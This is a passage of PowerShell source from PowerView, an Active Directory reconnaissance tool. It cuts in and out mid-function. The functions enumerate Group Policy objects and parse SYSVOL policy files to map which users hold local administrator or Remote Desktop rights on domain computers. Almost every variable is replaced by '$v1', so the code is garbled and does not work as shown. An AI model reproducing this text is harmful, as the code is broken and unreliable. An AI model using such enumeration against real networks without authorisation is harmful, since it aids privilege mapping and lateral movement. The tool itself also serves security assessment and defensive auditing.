                $v1 += Get-DomainDFSShareV1 @SearcherArguments
            }
            if ($v1 -match 'all|2') {
                $v1 += Get-DomainDFSShareV2 @SearcherArguments
            }
        }

        $v1 | Sort-Object -Property ('RemoteServerName','Name') -Unique
    }
}








function Get-GptTmpl {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('gpcfilesyspath', 'Path')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
    }

    PROCESS {
        try {
            if (($v1 -Match '\\\\.*\\.*') -and ($v1['Credential'])) {
                $v1 = "\\$((New-Object System.Uri($v1)).Host)\SYSVOL"
                if (-not $v1[$v1]) {

                    Add-RemoteConnection -Path $v1 -Credential $v1
                    $v1[$v1] = $v1
                }
            }

            $v1 = $v1
            if (-not $v1.EndsWith('.inf')) {
                $v1 += '\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf'
            }

            Write-Verbose "[Get-GptTmpl] Parsing GptTmplPath: $v1"

            if ($v1['OutputObject']) {
                $v1 = Get-IniContent -Path $v1 -OutputObject -ErrorAction Stop
                if ($v1) {
                    $v1 | Add-Member Noteproperty 'Path' $v1
                    $v1
                }
            }
            else {
                $v1 = Get-IniContent -Path $v1 -ErrorAction Stop
                if ($v1) {
                    $v1['Path'] = $v1
                    $v1
                }
            }
        }
        catch {
            Write-Verbose "[Get-GptTmpl] Error parsing $v1 : $v1"
        }
    }

    END {

        $v1.Keys | ForEach-Object { Remove-RemoteConnection -Path $v1 }
    }
}


function Get-GroupsXML {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GroupsXML')]
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('Path')]
        [String]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
    }

    PROCESS {
        try {
            if (($v1 -Match '\\\\.*\\.*') -and ($v1['Credential'])) {
                $v1 = "\\$((New-Object System.Uri($v1)).Host)\SYSVOL"
                if (-not $v1[$v1]) {

                    Add-RemoteConnection -Path $v1 -Credential $v1
                    $v1[$v1] = $v1
                }
            }

            [XML]$v1 = Get-Content -Path $v1 -ErrorAction Stop


            $v1 | Select-Xml "/Groups/Group" | Select-Object -ExpandProperty node | ForEach-Object {

                $v1 = $v1.Properties.groupName


                $v1 = $v1.Properties.groupSid
                if (-not $v1) {
                    if ($v1 -match 'Administrators') {
                        $v1 = 'S-1-5-32-544'
                    }
                    elseif ($v1 -match 'Remote Desktop') {
                        $v1 = 'S-1-5-32-555'
                    }
                    elseif ($v1 -match 'Guests') {
                        $v1 = 'S-1-5-32-546'
                    }
                    else {
                        if ($v1['Credential']) {
                            $v1 = ConvertTo-SID -ObjectName $v1 -Credential $v1
                        }
                        else {
                            $v1 = ConvertTo-SID -ObjectName $v1
                        }
                    }
                }


                $v1 = $v1.Properties.members | Select-Object -ExpandProperty Member | Where-Object { $v1.action -match 'ADD' } | ForEach-Object {
                    if ($v1.sid) { $v1.sid }
                    else { $v1.name }
                }

                if ($v1) {

                    if ($v1.filters) {
                        $v1 = $v1.filters.GetEnumerator() | ForEach-Object {
                            New-Object -TypeName PSObject -Property @{'Type' = $v1.LocalName;'Value' = $v1.name}
                        }
                    }
                    else {
                        $v1 = $v1
                    }

                    if ($v1 -isnot [System.Array]) { $v1 = @($v1) }

                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'GPOPath' $v1
                    $v1 | Add-Member Noteproperty 'Filters' $v1
                    $v1 | Add-Member Noteproperty 'GroupName' $v1
                    $v1 | Add-Member Noteproperty 'GroupSID' $v1
                    $v1 | Add-Member Noteproperty 'GroupMemberOf' $v1
                    $v1 | Add-Member Noteproperty 'GroupMembers' $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.GroupsXML')
                    $v1
                }
            }
        }
        catch {
            Write-Verbose "[Get-GroupsXML] Error parsing $v1 : $v1"
        }
    }

    END {

        $v1.Keys | ForEach-Object { Remove-RemoteConnection -Path $v1 }
    }
}


function Get-DomainGPO {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.GPO')]
    [OutputType('PowerView.GPO.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $v1,

        [Parameter(ParameterSetName = 'ComputerIdentity')]
        [Alias('ComputerName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [Alias('UserName')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $v1,

        [Switch]
        $v1,

        [Alias('ReturnOne')]
        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Properties']) { $v1['Properties'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['SecurityMasks']) { $v1['SecurityMasks'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
        $v1 = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($v1) {
            if ($v1['ComputerIdentity'] -or $v1['UserIdentity']) {
                $v1 = @()
                if ($v1['Properties']) {
                    $v1 = $v1['Properties']
                }
                $v1['Properties'] = 'distinguishedname,dnshostname'
                $v1 = $v1

                if ($v1['ComputerIdentity']) {
                    $v1['Identity'] = $v1
                    $v1 = Get-DomainComputer @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $v1) {
                        Write-Verbose "[Get-DomainGPO] Computer '$v1' not found!"
                    }
                    $v1 = $v1.distinguishedname
                    $v1 = $v1.dnshostname
                }
                else {
                    $v1['Identity'] = $v1
                    $v1 = Get-DomainUser @SearcherArguments -FindOne | Select-Object -First 1
                    if(-not $v1) {
                        Write-Verbose "[Get-DomainGPO] User '$v1' not found!"
                    }
                    $v1 = $v1.distinguishedname
                }


                $v1 = @()
                $v1 += $v1.split(',') | ForEach-Object {
                    if($v1.startswith('OU=')) {
                        $v1.SubString($v1.IndexOf("$($v1),"))
                    }
                }
                Write-Verbose "[Get-DomainGPO] object OUs: $v1"

                if ($v1) {

                    $v1.Remove('Properties')
                    $v1 = $v1
                    ForEach($v1 in $v1) {
                        $v1['Identity'] = $v1
                        $v1 += Get-DomainOU @SearcherArguments | ForEach-Object {

                            if ($v1.gplink) {
                                $v1.gplink.split('][') | ForEach-Object {
                                    if ($v1.startswith('LDAP')) {
                                        $v1 = $v1.split(';')
                                        $v1 = $v1[0]
                                        $v1 = $v1[1]

                                        if ($v1) {


                                            if ($v1 -eq 2) {
                                                $v1
                                            }
                                        }
                                        else {

                                            $v1
                                        }
                                    }
                                }
                            }


                            if ($v1.gpoptions -eq 1) {
                                $v1 = $v1
                            }
                        }
                    }
                }

                if ($v1) {

                    $v1 = (Get-NetComputerSiteName -ComputerName $v1).SiteName
                    if($v1 -and ($v1 -notlike 'Error*')) {
                        $v1['Identity'] = $v1
                        $v1 += Get-DomainSite @SearcherArguments | ForEach-Object {
                            if($v1.gplink) {

                                $v1.gplink.split('][') | ForEach-Object {
                                    if ($v1.startswith('LDAP')) {
                                        $v1.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }


                $v1 = $v1.SubString($v1.IndexOf('DC='))
                $v1.Remove('Identity')
                $v1.Remove('Properties')
                $v1['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$v1)"
                $v1 += Get-DomainObject @SearcherArguments | ForEach-Object {
                    if($v1.gplink) {

                        $v1.gplink.split('][') | ForEach-Object {
                            if ($v1.startswith('LDAP')) {
                                $v1.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[Get-DomainGPO] GPOAdsPaths: $v1"


                if ($v1) { $v1['Properties'] = $v1 }
                else { $v1.Remove('Properties') }
                $v1.Remove('Identity')

                $v1 | Where-Object {$v1 -and ($v1 -ne '')} | ForEach-Object {

                    $v1['SearchBase'] = $v1
                    $v1['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    Get-DomainObject @SearcherArguments | ForEach-Object {
                        if ($v1['Raw']) {
                            $v1.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $v1.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $v1
                    }
                }
            }
            else {
                $v1 = ''
                $v1 = ''
                $v1 | Where-Object {$v1} | ForEach-Object {
                    $v1 = $v1.Replace('(', '\28').Replace(')', '\29')
                    if ($v1 -match 'LDAP://|^CN=.*') {
                        $v1 += "(distinguishedname=$v1)"
                        if ((-not $v1['Domain']) -and (-not $v1['SearchBase'])) {


                            $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[Get-DomainGPO] Extracted domain '$v1' from '$v1'"
                            $v1['Domain'] = $v1
                            $v1 = Get-DomainSearcher @SearcherArguments
                            if (-not $v1) {
                                Write-Warning "[Get-DomainGPO] Unable to retrieve domain searcher for '$v1'"
                            }
                        }
                    }
                    elseif ($v1 -match '{.*}') {
                        $v1 += "(name=$v1)"
                    }
                    else {
                        try {
                            $v1 = (-Join (([Guid]$v1).ToByteArray() | ForEach-Object {$v1.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $v1 += "(objectguid=$v1)"
                        }
                        catch {
                            $v1 += "(displayname=$v1)"
                        }
                    }
                }
                if ($v1 -and ($v1.Trim() -ne '') ) {
                    $v1 += "(|$v1)"
                }

                if ($v1['LDAPFilter']) {
                    Write-Verbose "[Get-DomainGPO] Using additional LDAP filter: $v1"
                    $v1 += "$v1"
                }

                $v1.filter = "(&(objectCategory=groupPolicyContainer)$v1)"
                Write-Verbose "[Get-DomainGPO] filter string: $($v1.filter)"

                if ($v1['FindOne']) { $v1 = $v1.FindOne() }
                else { $v1 = $v1.FindAll() }
                $v1 | Where-Object {$v1} | ForEach-Object {
                    if ($v1['Raw']) {

                        $v1 = $v1
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($v1['SearchBase'] -and ($v1 -Match '^GC://')) {
                            $v1 = Convert-LDAPProperty -Properties $v1.Properties
                            try {
                                $v1 = $v1.distinguishedname
                                $v1 = $v1.SubString($v1.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $v1 = "\\$v1\SysVol\$v1\Policies\$($v1.cn)"
                                $v1 | Add-Member Noteproperty 'gpcfilesyspath' $v1
                            }
                            catch {
                                Write-Verbose "[Get-DomainGPO] Error calculating gpcfilesyspath for: $($v1.distinguishedname)"
                            }
                        }
                        else {
                            $v1 = Convert-LDAPProperty -Properties $v1.Properties
                        }
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $v1
                }
                if ($v1) {
                    try { $v1.dispose() }
                    catch {
                        Write-Verbose "[Get-DomainGPO] Error disposing of the Results object: $v1"
                    }
                }
                $v1.dispose()
            }
        }
    }
}


function Get-DomainGPOLocalGroup {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $v1,

        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['LDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['SearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($v1['Identity']) { $v1['Identity'] = $v1 }

        Get-DomainGPO @SearcherArguments | ForEach-Object {
            $v1 = $v1.displayname
            $v1 = $v1.name
            $v1 = $v1.gpcfilesyspath

            $v1 =  @{ 'GptTmplPath' = "$v1\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }


            $v1 = Get-GptTmpl @ParseArgs

            if ($v1 -and ($v1.psbase.Keys -contains 'Group Membership')) {
                $v1 = @{}


                ForEach ($v1 in $v1.'Group Membership'.GetEnumerator()) {
                    $v1, $v1 = $v1.Key.Split('__', $v1) | ForEach-Object {$v1.Trim()}

                    $v1 = $v1.Value | Where-Object {$v1} | ForEach-Object { $v1.Trim('*') } | Where-Object {$v1}

                    if ($v1['ResolveMembersToSIDs']) {

                        $v1 = @()
                        ForEach ($v1 in $v1) {
                            if ($v1 -and ($v1.Trim() -ne '')) {
                                if ($v1 -notmatch '^S-1-.*') {
                                    $v1 = @{'ObjectName' = $v1}
                                    if ($v1['Domain']) { $v1['Domain'] = $v1 }
                                    $v1 = ConvertTo-SID @ConvertToArguments

                                    if ($v1) {
                                        $v1 += $v1
                                    }
                                    else {
                                        $v1 += $v1
                                    }
                                }
                                else {
                                    $v1 += $v1
                                }
                            }
                        }
                        $v1 = $v1
                    }

                    if (-not $v1[$v1]) {
                        $v1[$v1] = @{}
                    }
                    if ($v1 -isnot [System.Array]) {$v1 = @($v1)}
                    $v1[$v1].Add($v1, $v1)
                }

                ForEach ($v1 in $v1.GetEnumerator()) {
                    if ($v1 -and $v1.Key -and ($v1.Key -match '^\*')) {

                        $v1 = $v1.Key.Trim('*')
                        if ($v1 -and ($v1.Trim() -ne '')) {
                            $v1 = ConvertFrom-SID -ObjectSID $v1 @ConvertArguments
                        }
                        else {
                            $v1 = $v1
                        }
                    }
                    else {
                        $v1 = $v1.Key

                        if ($v1 -and ($v1.Trim() -ne '')) {
                            if ($v1 -match 'Administrators') {
                                $v1 = 'S-1-5-32-544'
                            }
                            elseif ($v1 -match 'Remote Desktop') {
                                $v1 = 'S-1-5-32-555'
                            }
                            elseif ($v1 -match 'Guests') {
                                $v1 = 'S-1-5-32-546'
                            }
                            elseif ($v1.Trim() -ne '') {
                                $v1 = @{'ObjectName' = $v1}
                                if ($v1['Domain']) { $v1['Domain'] = $v1 }
                                $v1 = ConvertTo-SID @ConvertToArguments
                            }
                            else {
                                $v1 = $v1
                            }
                        }
                    }

                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'GPODisplayName' $v1
                    $v1 | Add-Member Noteproperty 'GPOName' $v1
                    $v1 | Add-Member Noteproperty 'GPOPath' $v1
                    $v1 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $v1 | Add-Member Noteproperty 'Filters' $v1
                    $v1 | Add-Member Noteproperty 'GroupName' $v1
                    $v1 | Add-Member Noteproperty 'GroupSID' $v1
                    $v1 | Add-Member Noteproperty 'GroupMemberOf' $v1.Value.Memberof
                    $v1 | Add-Member Noteproperty 'GroupMembers' $v1.Value.Members
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $v1
                }
            }


            $v1 =  @{
                'GroupsXMLpath' = "$v1\MACHINE\Preferences\Groups\Groups.xml"
            }

            Get-GroupsXML @ParseArgs | ForEach-Object {
                if ($v1['ResolveMembersToSIDs']) {
                    $v1 = @()
                    ForEach ($v1 in $v1.GroupMembers) {
                        if ($v1 -and ($v1.Trim() -ne '')) {
                            if ($v1 -notmatch '^S-1-.*') {


                                $v1 = @{'ObjectName' = $v1}
                                if ($v1['Domain']) { $v1['Domain'] = $v1 }
                                $v1 = ConvertTo-SID -Domain $v1 -ObjectName $v1

                                if ($v1) {
                                    $v1 += $v1
                                }
                                else {
                                    $v1 += $v1
                                }
                            }
                            else {
                                $v1 += $v1
                            }
                        }
                    }
                    $v1.GroupMembers = $v1
                }

                $v1 | Add-Member Noteproperty 'GPODisplayName' $v1
                $v1 | Add-Member Noteproperty 'GPOName' $v1
                $v1 | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $v1.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $v1
            }
        }
    }
}


function Get-DomainGPOUserLocalGroupMapping {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $v1,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $v1 = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        $v1 = @()

        if ($v1['Identity']) {
            $v1 += Get-DomainObject @CommonArguments -Identity $v1 | Select-Object -Expand objectsid
            $v1 = $v1
            if (-not $v1) {
                Throw "[Get-DomainGPOUserLocalGroupMapping] Unable to retrieve SID for identity '$v1'"
            }
        }
        else {

            $v1 = @('*')
        }

        if ($v1 -match 'S-1-5') {
            $v1 = $v1
        }
        elseif ($v1 -match 'Admin') {
            $v1 = 'S-1-5-32-544'
        }
        else {

            $v1 = 'S-1-5-32-555'
        }

        if ($v1[0] -ne '*') {
            ForEach ($v1 in $v1) {
                Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Enumerating nested group memberships for: '$v1'"
                $v1 += Get-DomainGroup @CommonArguments -Properties 'objectsid' -MemberIdentity $v1 | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Target localgroup SID: $v1"
        Write-Verbose "[Get-DomainGPOUserLocalGroupMapping] Effective target domain SIDs: $v1"

        $v1 = Get-DomainGPOLocalGroup @CommonArguments -ResolveMembersToSIDs | ForEach-Object {
            $v1 = $v1

            if ($v1.GroupSID -match $v1) {
                $v1.GroupMembers | Where-Object {$v1} | ForEach-Object {
                    if ( ($v1[0] -eq '*') -or ($v1 -Contains $v1) ) {
                        $v1
                    }
                }
            }

            if ( ($v1.GroupMemberOf -contains $v1) ) {
                if ( ($v1[0] -eq '*') -or ($v1 -Contains $v1.GroupSID) ) {
                    $v1
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $v1 | Where-Object {$v1} | ForEach-Object {
            $v1 = $v1.GPODisplayName
            $v1 = $v1.GPOName
            $v1 = $v1.GPOPath
            $v1 = $v1.GPOType
            if ($v1.GroupMembers) {
                $v1 = $v1.GroupMembers
            }
            else {
                $v1 = $v1.GroupSID
            }

            $v1 = $v1.Filters

            if ($v1[0] -eq '*') {

                $v1 = $v1
            }
            else {
                $v1 = $v1
            }


            Get-DomainOU @CommonArguments -Raw -Properties 'name,distinguishedname' -GPLink $v1 | ForEach-Object {
                if ($v1) {
                    $v1 = Get-DomainComputer @CommonArguments -Properties 'dnshostname,distinguishedname' -SearchBase $v1.Path | Where-Object {$v1.distinguishedname -match ($v1.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $v1 = Get-DomainComputer @CommonArguments -Properties 'dnshostname' -SearchBase $v1.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($v1) {
                    if ($v1 -isnot [System.Array]) {$v1 = @($v1)}

                    ForEach ($v1 in $v1) {
                        $v1 = Get-DomainObject @CommonArguments -Identity $v1 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $v1 = @('268435456','268435457','536870912','536870913') -contains $v1.samaccounttype

                        $v1 = New-Object PSObject
                        $v1 | Add-Member Noteproperty 'ObjectName' $v1.samaccountname
                        $v1 | Add-Member Noteproperty 'ObjectDN' $v1.distinguishedname
                        $v1 | Add-Member Noteproperty 'ObjectSID' $v1.objectsid
                        $v1 | Add-Member Noteproperty 'Domain' $v1
                        $v1 | Add-Member Noteproperty 'IsGroup' $v1
                        $v1 | Add-Member Noteproperty 'GPODisplayName' $v1
                        $v1 | Add-Member Noteproperty 'GPOGuid' $v1
                        $v1 | Add-Member Noteproperty 'GPOPath' $v1
                        $v1 | Add-Member Noteproperty 'GPOType' $v1
                        $v1 | Add-Member Noteproperty 'ContainerName' $v1.Properties.distinguishedname
                        $v1 | Add-Member Noteproperty 'ComputerName' $v1
                        $v1.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $v1
                    }
                }
            }


            Get-DomainSite @CommonArguments -Properties 'siteobjectbl,distinguishedname' -GPLink $v1 | ForEach-Object {
                ForEach ($v1 in $v1) {
                    $v1 = Get-DomainObject @CommonArguments -Identity $v1 -Properties 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $v1 = @('268435456','268435457','536870912','536870913') -contains $v1.samaccounttype

                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'ObjectName' $v1.samaccountname
                    $v1 | Add-Member Noteproperty 'ObjectDN' $v1.distinguishedname
                    $v1 | Add-Member Noteproperty 'ObjectSID' $v1.objectsid
                    $v1 | Add-Member Noteproperty 'IsGroup' $v1
                    $v1 | Add-Member Noteproperty 'Domain' $v1
                    $v1 | Add-Member Noteproperty 'GPODisplayName' $v1
                    $v1 | Add-Member Noteproperty 'GPOGuid' $v1
                    $v1 | Add-Member Noteproperty 'GPOPath' $v1
                    $v1 | Add-Member Noteproperty 'GPOType' $v1
                    $v1 | Add-Member Noteproperty 'ContainerName' $v1.distinguishedname
                    $v1 | Add-Member Noteproperty 'ComputerName' $v1.siteobjectbl
                    $v1.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $v1
                }
            }
        }
    }
}


function Get-DomainGPOComputerLocalGroupMapping {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $v1,

        [Parameter(Mandatory = $v1, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $v1,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $v1 = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 = @{}
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }
    }

    PROCESS {
        if ($v1['ComputerIdentity']) {
            $v1 = Get-DomainComputer @CommonArguments -Identity $v1 -Properties 'distinguishedname,dnshostname'

            if (-not $v1) {
                throw "[Get-DomainGPOComputerLocalGroupMapping] Computer $v1 not found. Try a fully qualified host name."
            }

            ForEach ($v1 in $v1) {

                $v1 = @()


                $v1 = $v1.distinguishedname
                $v1 = $v1.IndexOf('OU=')
                if ($v1 -gt 0) {
                    $v1 = $v1.SubString($v1)
                }
                if ($v1) {
                    $v1 += Get-DomainOU @CommonArguments -SearchBase $v1 -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $v1.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$v1.Matches | Select-Object -ExpandProperty Value }
                    }
                }


                Write-Verbose "Enumerating the sitename for: $($v1.dnshostname)"
                $v1 = (Get-NetComputerSiteName -ComputerName $v1.dnshostname).SiteName
                if ($v1 -and ($v1 -notmatch 'Error')) {
                    $v1 += Get-DomainSite @CommonArguments -Identity $v1 -LDAPFilter '(gplink=*)' | ForEach-Object {
                        Select-String -InputObject $v1.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$v1.Matches | Select-Object -ExpandProperty Value }
                    }
                }


                $v1 | Get-DomainGPOLocalGroup @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $v1 = $v1

                    if($v1.GroupMembers) {
                        $v1 = $v1.GroupMembers
                    }
                    else {
                        $v1 = $v1.GroupSID
                    }

                    $v1 | ForEach-Object {
                        $v1 = Get-DomainObject @CommonArguments -Identity $v1
                        $v1 = @('268435456','268435457','536870912','536870913') -contains $v1.samaccounttype

                        $v1 = New-Object PSObject
                        $v1 | Add-Member Noteproperty 'ComputerName' $v1.dnshostname
                        $v1 | Add-Member Noteproperty 'ObjectName' $v1.samaccountname
